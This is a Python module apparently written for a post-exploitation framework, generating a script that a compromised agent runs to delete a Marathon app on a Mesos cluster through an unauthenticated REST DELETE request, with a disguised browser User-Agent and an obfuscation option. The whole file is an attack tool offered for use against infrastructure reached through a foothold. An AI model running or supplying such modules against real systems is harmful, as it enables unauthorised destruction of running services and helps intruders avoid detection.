from lib.common import helpers
class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'Marathon API Delete App',
            'Author': ['@TweekFawkes'],
            'Description': ('Delete a Marathon App using Marathon\'s REST API'),
            'Background' : True,
            'OutputExtension': "",
            'NeedsAdmin' : False,
            'OpsecSafe' : True,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': ["Marathon REST API documentation version 2.0: https://mesosphere.github.io/marathon/docs/generated/api.html", "Marathon REST API: https://mesosphere.github.io/marathon/docs/rest-api.html", "Marathon REST API: https://open.mesosphere.com/advanced-course/marathon-rest-api/"]
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Target' : {
                'Description'   :   'FQDN, domain name, or hostname to lookup on the remote target.',
                'Required'      :   True,
                'Value'         :   'marathon.mesos'
            },
            'Port' : {
                'Description'   :   'The port to connect to.',
                'Required'      :   True,
                'Value'         :   '8080'
            },
            'ID' : {
                'Description'   :   'The id of the marathon app.',
                'Required'      :   True,
                'Value'         :   'app001'
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        target = self.options['Target']['Value']
        port = self.options['Port']['Value']
        appId = self.options['ID']['Value']
        script = """
import urllib2
target = "%s"
port = "%s"
appId = "%s"
url = "http://" + target + ":" + port + "/v2/apps/" + appId
class MethodRequest(urllib2.Request):
    def __init__(self, *args, **kwargs):
        if 'method' in kwargs:
            self._method = kwargs['method']
            del kwargs['method']
        else:
            self._method = None
        return urllib2.Request.__init__(self, *args, **kwargs)
    def get_method(self, *args, **kwargs):
        if self._method is not None:
            return self._method
        return urllib2.Request.get_method(self, *args, **kwargs)
try:
    request = MethodRequest(url, method='DELETE')
    request.add_header('User-Agent',
                   'Mozilla/6.0 (X11; Linux x86_64; rv:24.0) '
                   'Gecko/20140205     Firefox/27.0 Iceweasel/25.3.0')
    opener = urllib2.build_opener(urllib2.HTTPHandler)
    content = opener.open(request).read()
    print str(content)
except Exception as e:
    print "Failure sending payload: " + str(e)
print "Finished"
""" %(target, port, appId)
        return script